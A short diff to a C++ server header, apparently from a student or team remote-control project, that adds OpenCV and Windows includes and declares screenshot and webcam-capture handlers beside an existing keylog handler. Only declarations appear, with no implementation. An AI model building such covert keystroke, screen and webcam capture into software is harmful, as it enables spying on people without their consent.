@@ -2,6 +2,13 @@
 #define SERVER_H_
 
 #include "common/Request.h"
+#include <opencv2/opencv.hpp>
+#include <opencv2/highgui/highgui.hpp>
+#include <windows.h>
+#include <stdio.h>
+#include <filesystem>
+
+using namespace cv;
 
 class Server {
     public:
@@ -24,6 +31,10 @@ class Server {
         
         // Thinh
         bool keylog(Request& request, Response &response);
+
+        //Duc
+        bool screenshot(Request& request, Response &response);
+        bool getVideoByWebcam(Request& request, Response &response);
         
         // Thuc hien
         bool processRequest(Request& request, Response &response);
